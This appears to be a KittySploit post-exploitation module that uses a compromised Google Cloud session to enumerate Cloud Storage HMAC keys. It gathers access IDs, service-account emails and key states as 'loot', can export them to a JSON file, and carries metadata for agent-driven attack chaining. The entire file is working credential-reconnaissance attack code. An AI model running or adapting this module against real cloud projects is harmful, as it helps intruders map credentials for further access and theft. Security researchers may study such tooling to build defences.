#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP Storage HMAC Keys Loot",
        "description": "List Cloud Storage HMAC keys used for S3-compatible interoperability access",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "gcs", "storage", "hmac", "credentials", "loot"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['credential_access', 'api_request'],
        'expected_requests': 5,
        'reversible': False,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    service_account_email = OptString("", "Filter HMAC keys by service account email", False)
    include_secrets = OptBool(False, "Fetch full HMAC key metadata including access IDs (never returns secret)", False)
    export_json = OptString("", "Optional output JSON file", False)

    def run(self):
        try:
            project_id = self._gcp_project_id()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False

            sa_filter = str(self.service_account_email or "").strip()
            print_info(f"Listing Cloud Storage HMAC keys in {project_id}...")
            keys = self._gcp_list_storage_hmac_keys(project_id, service_account_email=sa_filter)
            if not keys:
                print_warning("No HMAC keys found")
                return self.module_result(success=True, data={"hmac_keys": []})

            loot = []
            for key in keys:
                resource = str(key.get("resourceId") or key.get("id") or "")
                entry = {
                    "accessId": key.get("accessId") or resource,
                    "serviceAccountEmail": key.get("serviceAccountEmail"),
                    "state": key.get("state"),
                    "timeCreated": key.get("timeCreated"),
                    "updated": key.get("updated"),
                    "projectId": key.get("projectId"),
                    "etag": key.get("etag"),
                }
                if self.include_secrets and resource:
                    detail = self._fetch_key_detail(project_id, resource)
                    if detail:
                        entry["detail"] = detail
                loot.append(entry)
                print_success(
                    f"{entry.get('accessId', 'unknown')} "
                    f"sa={entry.get('serviceAccountEmail')} state={entry.get('state')}"
                )

            payload = {"project_id": project_id, "hmac_keys": loot}
            exported = self._gcp_export_json(self.export_json, payload) if self.export_json else ""
            if exported:
                print_success(f"Loot exported to {exported}")
            print_success(f"Found {len(loot)} HMAC key(s)")
            return self.module_result(success=True, data=payload)
        except Exception as exc:
            print_error(f"Storage HMAC key loot failed: {exc}")
            return False

    def _fetch_key_detail(self, project_id, access_id):
        url = (
            f"https://storage.googleapis.com/storage/v1/projects/{self._quote_project(project_id)}"
            f"/hmacKeys/{access_id}"
        )
        body = self._gcp_get_body(url)
        return body if isinstance(body, dict) else None
